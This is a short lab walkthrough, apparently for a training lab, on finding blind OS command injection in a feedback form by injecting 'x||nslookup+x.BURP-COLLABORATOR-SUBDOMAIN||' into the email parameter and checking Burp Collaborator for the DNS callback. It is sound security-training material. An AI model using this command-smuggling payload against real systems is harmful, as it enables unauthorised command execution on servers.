>> Target Lab: Blind OS command injection with out-of-band interaction

---
**Vulnerability**
- Blind OS command injection vulnerability in the feedback function.

**Goal**
- Trigger an out-of-band DNS lookup to Burp Collaborator to confirm command execution.

---

### Steps:

#### 1. Open the Lab
- Access the lab interface in the browser.

#### 2. Intercept the Feedback Request
- Fill out the feedback form with dummy data.
- Capture the POST request in Burp Suite and send it to **Repeater**.
- ![alt text]({2E37BEE6-378A-44A3-9418-BA7AACFCB321}.png)

#### 3. Inject OOB Payload in `email` Parameter
- Modify the `email` parameter:
```http
  email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
```
- Right-click the payload → **Insert Collaborator payload** (Burp auto-fills your unique Collaborator subdomain).


#### 4. Send the Request
- URL-encode if needed (`Ctrl + U`) and send.
- Response returns normally — no visible output (blind + async execution).
- ![alt text]({47F35A91-9A62-4167-82FB-F60F7A89DE80}.png)

#### 5. Check Burp Collaborator
- Go to **Burp > Collaborator** tab → click **Poll now**.
- A DNS interaction from the target server confirms the command executed.
- ![alt text]({0F1394BC-3111-4035-A397-B8E44B2A5363}.png)

#### 6. Lab Solved
- Once the DNS lookup is received by Collaborator, the lab is automatically marked "Solved".
- ![alt text]({E40A0C40-73C6-48CB-882D-96F28EE6654E}.png)